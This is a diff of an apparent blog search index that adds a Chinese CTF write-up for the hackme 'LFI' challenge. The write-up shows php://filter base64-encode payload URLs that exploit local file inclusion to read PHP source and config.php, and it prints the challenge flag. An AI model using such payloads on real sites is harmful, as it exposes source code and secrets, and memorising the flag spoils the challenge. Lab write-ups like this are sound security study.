@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>LFI</title>
+      <link href="/2019/09/30/LFI/"/>
+      <url>/2019/09/30/LFI/</url>
+      
+        <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含。题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> LFI </tag>
+            
+            <tag> 本地文件包含 </tag>
+            
+            <tag> php://filter </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>homepage</title>
       <link href="/2019/09/30/homepage/"/>
       <url>/2019/09/30/homepage/</url>
@@ -20,7 +49,7 @@
       
         <tags>
             
-            <tag> js </tag>
+            <tag> JavaScript </tag>
             
         </tags>
       
@@ -91,9 +120,9 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> AES </tag>
+            
+            <tag> python </tag>
             
         </tags>
       
@@ -174,9 +203,9 @@
       
         <tags>
             
-            <tag> base64 </tag>
-            
             <tag> python </tag>
+            
+            <tag> base64 </tag>
             
         </tags>
       
@@ -284,9 +313,9 @@
       
         <tags>
             
-            <tag> base64 </tag>
-            
             <tag> python </tag>
+            
+            <tag> base64 </tag>
             
         </tags>
       
